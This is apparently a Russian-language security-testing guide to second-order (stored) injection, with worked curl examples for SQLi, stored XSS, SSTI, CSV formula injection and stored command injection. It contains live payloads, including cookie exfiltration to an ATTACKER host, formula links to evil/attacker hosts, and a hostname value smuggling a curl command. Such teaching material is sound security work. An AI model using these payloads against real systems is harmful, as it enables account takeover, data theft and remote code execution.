Second-order (stored) инъекция — это инъекция, которая **не срабатывает сразу**, а откладывается: вредоносное значение сохраняется в БД/файл/кеш, а исполняется позже, когда другой код читает его и подставляет в опасный контекст. Классика — регистрация пользователя с логином `admin'--`, который позже попадает в SQL при смене пароля, или stored XSS в профиле, который открывает админ. Такие баги легко пропустить при сканировании, потому что запрос-«источник» выглядит безобидно.

## Теория: разрыв между вводом и использованием

Обычная инъекция: ввод → сразу в опасный sink (один запрос). Second-order: ввод → **сохранение** (безопасный параметризованный INSERT) → позже **чтение** и подстановка в sink. Поэтому WAF/сканы, смотрящие только на текущий запрос, ничего не находят. Ключ — найти место, где сохранённое значение используется повторно.

## Виды

| Тип | Источник | Поздний sink |
|-----|----------|--------------|
| Second-order SQLi | логин/имя при регистрации | смена пароля, отчёт, экспорт |
| Stored XSS | профиль/комментарий | страница админа, лог-вьюер |
| Stored command injection | имя хоста/поле | cron/бэкап-скрипт |
| Stored SSTI | шаблон/имя | генерация письма/PDF |
| Stored LDAP | атрибут | фильтр поиска |
| Stored path traversal | имя файла | бэкап/экспорт |

## Разобранный пример: second-order SQLi

Приложение при регистрации сохраняет логин через параметризованный запрос (безопасно). При смене пароля оно строит запрос конкатенацией, подставляя сохранённый логин.

Шаг 1 — регистрируем пользователя с логином-инъекцией:

```bash
curl -s -X POST https://app.example/register \
  --data-urlencode "username=attacker' OR '1'='1' -- " --data-urlencode "password=Passw0rd!"
```

Шаг 2 — триггерим использование сохранённого логина:

```bash
curl -s -X POST https://app.example/change-password \
  --data-urlencode "newpass=x" -b cookies.txt
```

Шаг 3 — если запрос смены пароля исполняет инъекцию (например, меняет пароль всем или возвращает чужую сессию), это second-order SQLi. Дальше — как обычная SQLi.

## Разобранный пример: stored XSS → admin takeover

Шаг 1 — сохраняем payload в поле, которое отображается админу (тикет, комментарий, имя пользователя):

```bash
curl -s -X POST https://app.example/tickets \
  --data-urlencode 'title=<img src=x onerror="fetch(`https://ATTACKER/?c=`+document.cookie)">' -b cookies.txt
```

Шаг 2 — ждём, пока админ откроет тикет (или провоцируем через поддержку).

Шаг 3 — получаем cookie/токен админа на своём listener → захват аккаунта. Если админка защищена HttpOnly — эксплуатируем через CSRF/действие от имени админа.

## Как искать

- Поля, которые **сохраняются** и потом **отображаются/используются**: имя, email, логин, «о себе», название компании.
- Экспорт в CSV/Excel/PDF (инъекция в формулу `=cmd|...`, см. ниже).
- Логи, которые просматривает админ (log viewer) — stored XSS.
- Отчёты/дашборды, где значение подставляется в запрос.
- Смена пароля/email/роли — типичный поздний sink для логина.
- CSV/Formula injection: значение `=HYPERLINK("http://evil/?"&A1)` в экспорте.

Признаки: сохранённое значение «странно» экранируется/обрезается при отображении; ошибки БД на страницах, не связанных с вводом.

## Разобранный пример: stored SSTI/шаблон

Поле «подпись» подставляется в шаблон письма на сервере:

```bash
curl -s -X POST https://app.example/profile --data-urlencode 'signature={{7*7}}' -b cookies.txt
```

Позже при отправке письма шаблон рендерится → в письме `49` → SSTI (см. `web-ssti`), эскалация до RCE.

## Инструменты

- **Burp** — ручной проход «сохранить → найти использование».
- **Burp Collaborator/`interactsh`** — детект OOB-срабатывания.
- **`sqlmap`** — second-order режим ограничен; чаще ручной подход.
- **`dalfox`/XSS-сканеры** — stored XSS (с оговорками).
- **`grep`/исходники** — найти места повторного использования сохранённых данных.

## Что дальше / decision

1. Есть поле, которое сохраняется → проследите, где оно отображается/используется.
2. Логин/имя попадает в SQL позже → second-order SQLi.
3. Значение отображается админу → stored XSS.
4. Значение уходит в шаблон/команду → stored SSTI/command injection.
5. Сработало → зафиксируйте цепочку «сохранение → триггер → результат» как PoC.

## Частые ошибки

- **Тестировать только текущий запрос.** Second-order требует второго шага.
- **Считать параметризованный INSERT безопасным.** Проблема в позднем чтении.
- **Игнорировать экспорт CSV/Excel.** Formula injection — тоже stored.
- **Забыть про log viewer.** Stored XSS в логах — частая цель админа.
- **Ломать прод.** Особенно при смене пароля/ролей — только с согласия.

## Полный разбор: second-order SQLi (с выводом)

End-to-end: регистрация с инъекцией → триггер через смену пароля.

Шаг 1. Регистрируем пользователя с логином-инъекцией (сам INSERT параметризован — безопасен):

```bash
curl -s -X POST https://app.example/register \
  --data-urlencode "username=x' OR '1'='1' -- -" \
  --data-urlencode "password=Passw0rd!" -c c.txt
# 200 {"ok":true,"id":42}
```

Шаг 2. Находим поздний sink — смену пароля, где логин подставляется конкатенацией:

```bash
curl -s -X POST https://app.example/change-password \
  -b c.txt --data-urlencode "old=Passw0rd!" --data-urlencode "new=Newpass1!"
# сервер строит: UPDATE users SET password='...' WHERE username='x' OR '1'='1' -- -'
# 500 или "affected rows: N"  -> инъекция сработала
```

Шаг 3. Проверяем эффект (read-back): сменился ли пароль у нескольких пользователей или у админа. В реальном тесте **не** меняйте чужие пароли — используйте свой стенд и фиксируйте только факт инъекции (например, ошибка/affected-rows).

Шаг 4. Если sink возвращает данные (отчёт/экспорт), извлекаем ими:

```bash
curl -s 'https://app.example/report?user=x' -b c.txt
# отчёт с данными других пользователей => second-order union
```

## Reference-таблица: типы stored-инъекций и sink'и

| Тип | Где сохраняется | Поздний sink |
|-----|-----------------|--------------|
| Second-order SQLi | логин/имя/email | смена пароля, отчёт, экспорт, поиск |
| Stored XSS | профиль, комментарий, тикет | страница админа, модерация, log viewer |
| Stored command injection | hostname, домен, поле бэкапа | cron, backup-скрипт, ping/traceroute |
| Stored SSTI | подпись, шаблон | рендер письма, PDF, страница |
| Stored LDAP | атрибут (dept, phone) | фильтр поиска пользователей |
| Stored path traversal | имя файла/архива | распаковка, скачивание, бэкап |
| CSV/Formula injection | любое поле | экспорт в Excel/Sheets у админа |
| Stored SSRF | webhook URL, аватар URL | серверный запрос позже |

## CSV/formula injection и stored XSS в log viewer

**Formula injection:** если поле попадает в CSV/Excel-экспорт, значение, начинающееся с `=`, `+`, `-`, `@`, интерпретируется как формула:

```bash
curl -s -X POST https://app.example/profile --data-urlencode 'name==HYPERLINK("http://attacker/?d="&A1,"click")' -b c.txt
```

Когда админ откроет экспорт, Excel выполнит формулу (эксфильтрация соседних ячеек, иногда DDE-команды). Это stored-инъекция без «серверного» sink.

**Stored XSS в log viewer:** если приложение показывает логи в веб-интерфейсе (админский просмотр), любое логируемое поле (User-Agent, имя пользователя, URL) становится вектором:

```bash
curl -s https://app.example/ -A '<img src=x onerror=alert(document.domain)>'
# когда админ откроет /admin/logs -> XSS выполнится
```

Проверьте, отражаются ли User-Agent/Referer/путь в HTML админ-панели без экранирования.

## Что делать дальше / решение

1. **Составить карту потока данных:** какие поля сохраняются и где читаются.
2. **Вставить маркер** (`x'`, `<b>`, `{{7*7}}`, `=1+1`) и найти, где он «всплывает».
3. **Триггерить sink** (смена пароля, экспорт, просмотр логов админом).
4. **Подтвердить** инъекцию (ошибка/данные/OOB), не ломая чужие данные.
5. **Оформить цепочку** «сохранение → триггер → результат» как PoC.
6. **Защита:** экранирование по контексту на выходе + параметризация на всех sink'ах.

## Инструменты и методология поиска

Second-order-инъекции требуют системного подхода, а не сканера:

- **Burp:** пройдите все формы, сохраняя данные, затем вручную проверьте каждое место, где они отображаются/используются. Ведите список «поле → где используется».
- **Burp Collaborator / `interactsh`:** для OOB-подтверждения (payload с callback) — если инъекция исполняется позже, коллаборатор поймает запрос.
- **`grep` по исходникам:** ищите, где сохранённые значения подставляются в SQL/шаблоны/команды (`"... "+user`, `sprintf`, `format`, `template`).
- **`dalfox`/XSS-сканеры:** могут поймать stored XSS, если пройти весь флоу (сохранить + открыть страницу просмотра).
- **CSV-экспорт:** скачайте экспорт и откройте — если значение начинается с `=`, `+`, `-`, `@`, проверьте formula injection.
- **Логи:** если есть админский log viewer, отправьте маркер в User-Agent/Referer/URL и проверьте отображение.

Практика: составьте таблицу «источник → sink → триггер». Для каждого сохранённого поля найдите минимум один поздний sink. Именно на этом разрыве живёт второй порядок инъекций. Не забывайте: защита — экранирование **на выходе**, по контексту, а не только на входе.

## Итог по second-order

Второй порядок — это про **поток данных**, а не про отдельный запрос. Метод: вставить маркер → найти все места его отображения/использования → триггерить. Инструменты (Collaborator, ручной проход в Burp, просмотр экспортов/логов) помогают, но главное — систематическая карта «сохранение → sink». Оформляйте находку как цепочку с точным триггером — это то, что отличает настоящий second-order от обычной инъекции.

## Пример: stored command injection через hostname

Поле `hostname` (для ping/мониторинга) сохраняется в БД, а позже подставляется в shell-команду бэкап-скрипта:

```bash
# сохраняем
curl -s -X POST https://app.example/servers --data-urlencode 'hostname=web1; curl http://ATTACKER/$(id|base64)' -b c.txt
# триггер: cron/бэкап выполняет ping/web1; curl ... -> RCE отложенно
```

Признак: поле выглядит «безобидным» при сохранении (никаких команд в текущем запросе), но исполняется позже в другом компоненте. Это классический second-order command injection — ищите поля, которые уходят в системные команды (мониторинг, бэкап, экспорт, генерация PDF).
